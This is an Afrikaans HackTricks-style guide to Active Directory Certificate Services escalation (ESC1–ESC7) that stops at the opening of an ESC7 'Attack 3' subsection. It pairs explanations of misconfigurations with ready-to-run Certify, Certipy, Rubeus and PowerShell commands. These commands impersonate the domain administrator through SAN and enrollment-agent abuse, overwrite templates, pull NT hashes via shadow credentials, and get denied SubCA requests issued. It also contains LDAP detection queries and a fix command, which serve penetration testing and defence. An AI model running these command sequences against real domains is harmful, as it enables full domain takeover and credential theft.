# AD CS Domein-escalasie

{{#include ../../../banners/hacktricks-training.md}}


**Dit is 'n opsomming van eskalasietegniek-afdelings van die plasings:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Verkeerd gekonfigureerde sertifikaatsjablone - ESC1

### Verduideliking

### Verkeerd gekonfigureerde sertifikaatsjablone - ESC1 verduidelik

- **Die Enterprise CA verleen inskrywingsregte aan gebruikers met lae voorregte.**
- **Bestuurdergoedkeuring word nie vereis nie.**
- **Geen handtekeninge van gemagtigde personeel word vereis nie.**
- **Sekuriteitsbeskrywers op sertifikaatsjablone is te permissief, wat gebruikers met lae voorregte toelaat om inskrywingsregte te verkry.**
- **Sertifikaatsjablone is so gekonfigureer dat dit EKU's definieer wat verifikasie moontlik maak:**
  - Uitgebreide sleutelgebruik (EKU)-identifiseerders soos Kliëntverifikasie (OID 1.3.6.1.5.5.7.3.2), PKINIT-kliëntverifikasie (1.3.6.1.5.2.3.4), Slimkaartaanmelding (OID 1.3.6.1.4.1.311.20.2.2), Enige doel (OID 2.5.29.37.0), of geen EKU (SubCA) is ingesluit.
- **Die sjabloon laat versoekers toe om 'n subjectAltName in die sertifikaatondertekeningsversoek (CSR) in te sluit:**
  - Active Directory (AD) prioritiseer die subjectAltName (SAN) in 'n sertifikaat vir identiteitsverifikasie, indien dit teenwoordig is. Dit beteken dat 'n sertifikaat aangevra kan word om enige gebruiker (bv. 'n domeinadministrateur) na te boots deur die SAN in 'n CSR te spesifiseer. Of die versoeker 'n SAN kan spesifiseer, word aangedui deur die `mspki-certificate-name-flag`-eienskap in die sertifikaatsjabloon se AD-objek. Hierdie eienskap is 'n bitmasker, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-vlag laat die versoeker toe om die SAN te spesifiseer.

> [!CAUTION]
> Hierdie instellings identifiseer 'n ESC1-sjabloonkandidaat, nie 'n voltooide nabootsingspad nie. Kontroleer dat die teikenprincipal kan inskryf op 'n CA wat die sjabloon publiseer, dat CA-inskrywing toegelaat word en dat die uitgereikte sertifikaat aan die sterk SID-karteringsreëls van die verifikasie-eindpunt voldoen. Huidige, gepatchte KDC's kan 'n aangevraagde UPN verwerp wanneer die sertifikaat se SID nie met die teiken ooreenstem nie; sien [Microsoft se leiding oor sertifikaatkartering](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Inskrywingsregte wat aan **Domain Computers** verleen word, kan 'n gefaseerde rekenaaridentiteit geskik maak, selfs wanneer die oorspronklike gebruiker nie kan inskryf nie. Beoordeel die rekenaarprincipal se regte afsonderlik. Kontroleer `msPKI-Minimal-Key-Size` voordat jy 'n versoek doen: 'n sjabloon wat 4096-bis RSA-sleutels vereis, sal 'n kliënt se verstek van 2048 bis verwerp. 'n Teiken-SID wat in die versoek verskaf word, kan 'n SID-wanpassing aanspreek slegs wanneer die CA en KDC die gevolglike sertifikaat en kartering aanvaar; nóg die sjabloonvlae nóg 'n Enroll-ACE alleen bewys dit.

Hierdie kenmerk word soms geaktiveer om die intydse generering van HTTPS- of gasheersertifikate deur produkte of ontplooiingsdienste te ondersteun, of weens 'n gebrek aan begrip.

Daar word opgemerk dat die skep van 'n sertifikaat met hierdie opsie 'n waarskuwing veroorsaak, wat nie die geval is wanneer 'n bestaande sertifikaatsjabloon (soos die `WebServer`-sjabloon, waarop `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer is) gedupliseer en dan gewysig word om 'n verifikasie-OID in te sluit nie.<sup>[[6]](#references)</sup>

### Misbruik

Om **kwesbare sertifikaatsjablone te vind**, kan jy uitvoer:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Om **hierdie kwesbaarheid te misbruik om as ’n administrateur voor te doen**, kan ’n mens die volgende uitvoer:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Dan kan jy die gegenereerde **sertifikaat na `.pfx`**-formaat omskakel en dit gebruik om weer met Rubeus of certipy te **authentiseer**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Die Windows-binaries "Certreq.exe" en "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die sertifikaatsjablone binne die AD-woud se konfigurasieskema kan opgespoor word deur die volgende LDAP-navraag uit te voer. Dit geld spesifiek vir sjablone wat nie goedkeuring of handtekeninge vereis nie, ’n Client Authentication- of Smart Card Logon-EKU het, en die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-vlag geaktiveer het:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Verkeerd gekonfigureerde sertifikaatsjablone - ESC2

### Verduideliking

Die tweede misbruikscenario is ’n variasie van die eerste een:

1. Die Enterprise CA verleen inskrywingsregte aan gebruikers met lae voorregte.
2. Die vereiste vir bestuurdergoedkeuring is gedeaktiveer.
3. Die vereiste vir gemagtigde handtekeninge is weggelaat.
4. ’n Té permissiewe sekuriteitsbeskrywer op die sertifikaatsjabloon verleen sertifikaatinskrywingsregte aan gebruikers met lae voorregte.
5. **Die sertifikaatsjabloon is gedefinieer om die Any Purpose EKU of geen EKU in te sluit nie.**

Die **Any Purpose EKU** laat ’n aanvaller toe om ’n sertifikaat vir **enige doel** te bekom, insluitend kliëntverifikasie, bedienerverifikasie, kodes onderteken, ens. Dieselfde **tegniek wat vir ESC3 gebruik word** kan ingespan word om hierdie scenario te misbruik.

Sertifikate **sonder EKU’s**, wat as ondergeskikte CA-sertifikate optree, kan vir **enige doel** misbruik word en kan **ook gebruik word om nuwe sertifikate te onderteken**. ’n Aanvaller kan dus willekeurige EKU’s of velde in die nuwe sertifikate spesifiseer deur ’n ondergeskikte CA-sertifikaat te gebruik.

Nuwe sertifikate wat vir **domeinverifikasie** geskep word, sal egter nie werk as die ondergeskikte CA nie deur die **`NTAuthCertificates`**-objek vertrou word nie; dit is die verstekinstelling. ’n Aanvaller kan nietemin **nuwe sertifikate met enige EKU** en willekeurige sertifikaatwaardes skep. Dit kan moontlik vir ’n wye reeks doeleindes **misbruik** word (bv. kode-ondertekening, bedienerverifikasie, ens.) en kan beduidende gevolge vir ander toepassings in die netwerk hê, soos SAML, AD FS of IPSec.<sup>[[6]](#references)</sup>

Om sjablone in die AD Forest se konfigurasieskema op te spoor wat met hierdie scenario ooreenstem, kan die volgende LDAP-navraag uitgevoer word:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Verkeerd opgestelde Enrollment Agent-sjablone - ESC3

### Verduideliking

Hierdie scenario is soos die eerste en tweede scenario, maar dit **misbruik** ’n **ander EKU** (Certificate Request Agent) en **2 verskillende sjablone** (dus het dit 2 stelle vereistes),

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), wat in Microsoft-dokumentasie as **Enrollment Agent** bekend staan, laat ’n prinsipaal toe om **’n sertifikaat in te skryf** **namens ’n ander gebruiker**.

Die **“enrollment agent”** skryf vir so ’n **sjabloon** in en gebruik die gevolglike **sertifikaat om ’n CSR namens die ander gebruiker mede te onderteken**. Dit **stuur** dan die **mede-ondertekende CSR** na die CA, skryf in vir ’n **sjabloon** wat **“enroll on behalf of” toelaat**, en die CA reageer met **’n sertifikaat wat aan die “ander” gebruiker behoort**.<sup>[[6]](#references)</sup>

**Vereistes 1:**

- Die Enterprise CA ken inskrywingsregte aan gebruikers met lae voorregte toe.
- Die vereiste vir bestuurdergoedkeuring is weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die sekuriteitsbeskrywer van die sertifikaatsjabloon is buitensporig permissief en ken inskrywingsregte aan gebruikers met lae voorregte toe.
- Die sertifikaatsjabloon sluit die Certificate Request Agent EKU in, wat dit moontlik maak om ander sertifikaatsjablone namens ander prinsipale aan te vra.

**Vereistes 2:**

- Die Enterprise CA ken inskrywingsregte aan gebruikers met lae voorregte toe.
- Bestuurdergoedkeuring word omseil.
- ’n Teikensjabloon van weergawe 1 kan ’n enrollment agent aanvaar sonder nuwer, meer gedetailleerde uitreikingsbeleidbeheer; vir weergawe 2 of nuwer moet die toepassingsbeleidsvereistes vir uitreiking en gemagtigde handtekeninge geëvalueer word, eerder as om die sjabloon bloot op grond van sy weergawe uit te sluit.
- ’n EKU wat in die sertifikaatsjabloon gedefinieer is, laat domeinverifikasie toe.
- Beperkings vir enrollment agents word nie op die CA toegepas nie.

Die teikensjabloon moet ook deur die gekose CA gepubliseer word, die teikenrekening toelaat om daarvoor in te skryf, en die beoogde gebruik vir domeinverifikasie ondersteun. Kontroleer die vereiste onderwerp-/SAN-kenmerke vir daardie rekening; byvoorbeeld, ’n sjabloon wat ’n onderwerp-e-posadres uit AD saamstel, kan nie vir ’n rekening uitgereik word wat nie die vereiste `mail`-waarde het nie. ’n Agent-sertifikaat alleen voldoen nie aan hierdie vereistes vir die teikensjabloon nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Die **gebruikers** wat toegelaat word om ’n **enrollment agent-sertifikaat** te **verkry**, die templates waarin enrollment **agents** toegelaat word om in te skryf, en die **rekeninge** namens wie die enrollment agent mag optree, kan deur enterprise CAs beperk word. Dit word gedoen deur die `certsrc.msc`-**snap-in** oop te maak, **regs te klik op die CA**, **Properties te klik** en dan na die “Enrollment Agents”-oortjie te **gaan**.

Daar word egter opgemerk dat die **verstek**-instelling vir CAs “**Do not restrict enrollment agents**” is. Wanneer administrateurs die beperking op enrollment agents aktiveer deur dit op “Restrict enrollment agents” te stel, bly die verstekkonfigurasie uiters permissief. Dit laat **Everyone** toe om in alle templates as enigiemand in te skryf.

### Slegs-Windows PowerShell-PoC's met Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) toets ESC1 en ESC2/ESC3 sonder Certify of Certipy. Sy scripts skep ’n uitvoerbare 2048-bis RSA-sleutel met die `X509Enrollment` COM API, bou ’n PKCS#10-versoek, ontdek die eerste `pKIEnrollmentService` deur LDAP, dien dit in via `CertificateAuthority.Request`, installeer die antwoord in `Cert:\CurrentUser\My` en voer ’n Base64-gekodeerde PFX uit. Die ESC1-script voeg ’n aanvallergekose UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, waarde `0xb`) by, terwyl die ESC2/ESC3-scripts die eerste sertifikaat gebruik om ’n PKCS#7-versoek namens iemand anders te onderteken.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Die scripts druk die Base64 van die **PFX** uit, wat die private key insluit, vir direkte gebruik met Rubeus. Moenie dit vervang met `[Convert]::ToBase64String($cert.RawData)` nie: `RawData` kodeer slegs die publieke sertifikaat en kan nie die PKINIT-versoek onderteken nie.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Kwesbare toegangsbeheer vir sertifikaatsjablone - ESC4

### **Verduideliking**

Die **sekuriteitsbeskrywer** op **sertifikaatsjablone** definieer die **toestemmings** waaroor spesifieke **AD-prinsipale** ten opsigte van die sjabloon beskik.

Indien ’n **aanvaller** die nodige **toestemmings** het om ’n **sjabloon** te **wysig** en enige **uitbuitbare verkeerde konfigurasies** wat in **vorige afdelings** uiteengesit is, in te stel, kan voorregte-eskalasie moontlik gemaak word.

Opmerklike toestemmings wat op sertifikaatsjablone van toepassing is, sluit in:<sup>[[6]](#references)</sup>

- **Owner:** Verleen implisiete beheer oor die objek, wat die wysiging van enige eienskappe moontlik maak.
- **FullControl:** Verleen volledige gesag oor die objek, insluitend die vermoë om enige eienskappe te wysig.
- **WriteOwner:** Laat toe dat die objek se eienaar verander word na ’n prinsipaal onder die aanvaller se beheer.
- **WriteDacl:** Laat toe dat toegangsbeheer aangepas word, wat moontlik FullControl aan ’n aanvaller verleen.
- **WriteProperty:** Laat toe dat enige objek-eienskappe geredigeer word.

Gaan ook die DACL na op die `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`-houer. ’n Toepaslike `CreateChild` ACE met omvang beperk tot die [`pKICertificateTemplate`-klas](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), of breë volle beheer, is ’n moontlike manier om ’n nuwe sjabloonobjek te skep. [Microsoft se dokumentasie](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) meld dat hierdie houer die sjabloonobjekte bevat. Gaan ooreenstemmende deny ACEs en oorerwing na voordat jy bepaal of die skep van ’n objek effektief sal wees. ’n Geskepte sjabloon reik nie op sigself ’n sertifikaat uit nie: ’n CA moet dit publiseer, die versoekende prinsipaal moet inskrywingstoegang hê, en die sertifikaat moet by die verifikasie-eindpunt aan die bedoelde identiteit gekoppel word.

### Misbruik

Om prinsipale met wysigingsregte op sjablone en ander PKI-objekte te identifiseer, enumereer met Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

’n Voorbeeld van ’n privesc soos die vorige een:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer ’n gebruiker skryfvoorregte oor ’n sertifikaatsjabloon het. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaatsjabloon te oorskryf en die sjabloon kwesbaar vir ESC1 te maak.

’n Sjabloon wat reeds die inskrywer toelaat om die onderwerp te spesifiseer, maar slegs Server Authentication as gebruik het, is nie op sigself ’n sjabloon vir gebruikeraanmelding nie. Met effektiewe beheerregte oor die sjabloon kan ’n aanvaller die verifikasie-EKU’s of toepassingsbeleide verander voordat ’n sertifikaat aangevra word; [Microsoft dokumenteer die aanmeldingsdoel van die Smartcard Logon EKU](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Verifieer dat ’n CA die gewysigde sjabloon publiseer, die aanvraer kan inskryf, die goedkeurings-/handtekeningvereistes nagekom word en die uitgereikte sertifikaat aan die bedoelde rekening gekoppel word. In die besonder verwerp [gepleisterde domeinbeheerders in Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) sertifikate sonder sterk kartering; om ’n teiken-UPN by ’n versoek te voeg, omseil nie daardie vereiste nie.

Soos ons in die pad hierbo kan sien, het slegs `JOHNPC` hierdie voorregte, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink`-rand na `JOHNPC`. Aangesien hierdie tegniek met sertifikate verband hou, het ek hierdie aanval ook geïmplementeer; dit staan bekend as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Hier is ’n klein voorskoutjie van Certipy se `shadow auto`-opdrag om die slagoffer se NT-hash te kry.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** kan die konfigurasie van 'n sertifikaatsjabloon met 'n enkele opdrag oorskryf. By **verstek** sal Certipy die konfigurasie **oorskryf** om dit **kwesbaar vir ESC1** te maak. Ons kan ook die **`-save-old`-parameter spesifiseer om die ou konfigurasie te stoor**, wat nuttig sal wees om die konfigurasie ná ons aanval te **herstel**.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Kwesbare PKI-objektoegangsbeheer - ESC5

### Verduideliking

Die uitgebreide web van onderling gekoppelde ACL-gebaseerde verhoudings, wat verskeie objekte buiten sertifikaatsjablone en die sertifikaatowerheid insluit, kan die sekuriteit van die hele AD CS-stelsel beïnvloed. Hierdie objekte, wat sekuriteit aansienlik kan raak, sluit in:

- Die AD-rekenaarobjek van die CA-bediener, wat moontlik deur meganismes soos S4U2Self of S4U2Proxy gekompromitteer kan word.
- Die RPC/DCOM-bediener van die CA-bediener.
- Enige afstammeling-AD-objek of -houer binne die spesifieke houerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit onder meer houers en objekte soos die Certificate Templates-houer, Certification Authorities-houer, die NTAuthCertificates-objek en die Enrollment Services-houer in.

Die sekuriteit van die PKI-stelsel kan gekompromitteer word as ’n aanvaller met lae regte daarin slaag om beheer oor enige van hierdie kritieke komponente te verkry.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat in die [**CQure Academy-plasing**](https://cqureacademy.com/blog/enhanced-key-usage) bespreek word, raak ook die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-vlag aan, soos deur Microsoft uiteengesit. Wanneer hierdie konfigurasie op ’n Certification Authority (CA) geaktiveer is, laat dit toe dat **gebruikerbepaalde waardes** in die **alternatiewe onderwerpnaam** vir **enige versoek** ingesluit word, ook dié wat uit Active Directory® saamgestel is. Gevolglik laat hierdie instelling ’n **indringer** toe om deur **enige sjabloon** in te skryf wat vir domein-**stawing** opgestel is—spesifiek sjablone wat vir **gebruikers sonder bevoorregte regte** oop is om in te skryf, soos die standaard User-sjabloon. ’n Sertifikaat kan dus verkry word waarmee die indringer as ’n domeinadministrateur of **enige ander aktiewe entiteit** binne die domein kan staaf.<sup>[[9]](#references)</sup>

**Let wel**: Die metode om **alternatiewe name** by ’n Certificate Signing Request (CSR) te voeg deur die `-attrib "SAN:"`-argument in `certreq.exe` (waarna verwys word as “Name Value Pairs”), verskil **van** die uitbuitingstrategie vir SAN’s in ESC1. Die onderskeid lê hier in **hoe rekeninginligting ingesluit word**—in ’n sertifikaatkenmerk eerder as ’n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Hierdie operasie maak in wese gebruik van **remote registry access**, daarom kan ’n alternatiewe benadering wees:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Gereedskap soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) kan hierdie wanopstelling opspoor en uitbuit:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Om hierdie instellings te verander, kan die volgende opdrag vanaf enige werkstasie uitgevoer word, mits ’n mens **domeinadministrateurregte** of die ekwivalent het:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Om hierdie konfigurasie in jou omgewing te deaktiveer, kan die vlag met die volgende verwyder word:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Ná die sekuriteitsopdaterings van Mei 2022 sal nuut uitgereikte **sertifikate** ’n **sekuriteitsuitbreiding** bevat wat die **aanvraer se `objectSid`-eienskap** insluit. Vir ESC1 word hierdie SID van die gespesifiseerde SAN afgelei. Vir **ESC6** weerspieël die SID egter die **aanvraer se `objectSid`**, nie die SAN nie.\
> Om ESC6 te ontgin, moet die stelsel kwesbaar wees vir ESC10 (Swak sertifikaatkarterings), wat **SAN bo die nuwe sekuriteitsuitbreiding prioritiseer**.

## Toegangsbeheer vir kwesbare sertifikaatowerheid - ESC7

### Aanval 1

#### Verduideliking

Toegangsbeheer vir ’n sertifikaatowerheid word deur ’n stel toestemmings gehandhaaf wat CA-aksies beheer. Hierdie toestemmings kan bekyk word deur `certsrv.msc` te open, met die regtermuisknoppie op ’n CA te klik, eienskappe te kies en dan na die Security-oortjie te gaan. Daarbenewens kan toestemmings met die PSPKI-module gelys word deur opdragte soos: te gebruik.

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Dit bied insig in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat onderskeidelik ooreenstem met die rolle van “CA-administrateur” en “Sertifikaatbestuurder”.<sup>[[6]](#references)</sup>

#### Misbruik

As ’n sertifikaatowerheid **`ManageCA`**-regte het, kan die sekuriteitsprinsipaal instellings op afstand met PSPKI manipuleer. Dit sluit in om die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-vlag aan te skakel sodat SAN-spesifikasie in enige template toegelaat word, ’n kritieke aspek van domein-escalation.

Hierdie proses kan vereenvoudig word deur PSPKI se **Enable-PolicyModuleFlag**-cmdlet te gebruik, wat wysigings moontlik maak sonder direkte GUI-interaksie.

**`ManageCertificates`**-regte maak dit moontlik om hangende versoeke goed te keur en sodoende die beskerming “CA-sertifikaatbestuurdergoedkeuring” effektief te omseil.

’n Kombinasie van **Certify**- en **PSPKI**-modules kan gebruik word om ’n sertifikaat aan te vra, goed te keur en af te laai:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Aanval 2

#### Verduideliking

> [!WARNING]
> In die **vorige aanval** is **`Manage CA`**-toestemmings gebruik om die **EDITF_ATTRIBUTESUBJECTALTNAME2**-vlag te **aktiveer** om die **ESC6-aanval** uit te voer, maar dit sal geen effek hê voordat die CA-diens (`CertSvc`) herbegin word nie. Wanneer ’n gebruiker die `Manage CA`-toegangsreg het, word die gebruiker ook toegelaat om die **diens te herbegin**. Dit **beteken egter nie dat die gebruiker die diens op afstand kan herbegin nie**. Verder werk E**SC6 dalk nie by verstek nie** in die meeste omgewings wat met die sekuriteitsopdaterings van Mei 2022 gepatch is.

Daarom word ’n ander aanval hier aangebied.

Voorvereistes:

- Slegs **`ManageCA`-toestemming**
- **`Manage Certificates`**-toestemming (kan vanaf **`ManageCA`** toegeken word)
- Sertifikaatsjabloon **`SubCA`** moet **geaktiveer** wees (kan vanaf **`ManageCA`** geaktiveer word)

Die tegniek maak staat op die feit dat gebruikers met die `Manage CA` _en_ `Manage Certificates`-toegangsreg **mislukte sertifikaatversoeke kan uitreik**. Die **`SubCA`**-sertifikaatsjabloon is **kwesbaar vir ESC1**, maar **slegs administrateurs** kan by die sjabloon inskryf. ’n **Gebruiker** kan dus **versoek** om by die **`SubCA`** in te skryf—wat **geweier** sal word—maar die versoek word **dan later deur die bestuurder uitgereik**.<sup>[[6]](#references)</sup>

#### Misbruik

Jy kan aan jouself die **`Manage Certificates`**-toegangsreg **toeken** deur jou gebruiker as ’n nuwe beampte by te voeg.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Die **`SubCA`**-sjabloon kan **op die CA geaktiveer** word met die `-enable-template`-parameter. By verstek is die `SubCA`-sjabloon geaktiveer.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

As ons aan die voorvereistes vir hierdie aanval voldoen het, kan ons begin deur **’n sertifikaat aan te vra wat op die `SubCA`-sjabloon gebaseer is**.

**Hierdie versoek sal geweier** word, maar ons sal die private sleutel stoor en die versoek-ID aanteken.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Met ons **`Manage CA` en `Manage Certificates`** kan ons dan die mislukte sertifikaataanvraag uitreik met die `ca`-opdrag en die `-issue-request <request ID>`-parameter.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

En laastens kan ons **die uitgereikte sertifikaat ophaal** met die `req`-opdrag en die `-retrieve <request ID>`-parameter.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Aanval 3 – Misbruik van Manage Certificates-uitbreiding (SetExtension)

#### Verduideliking

Benewens die klassieke ESC7-misbruike (waar EDITF-kenmerke geaktiveer word of hangende versoeke goedgekeur word), het **Certify 2.0** ’n splinternuwe primitief onthul wat slegs die *Manage Certificates* (ook bekend as die **Certificate Manager / Officer**)-rol op die Enterprise CA vereis.<sup>[[3]](#references)</sup>

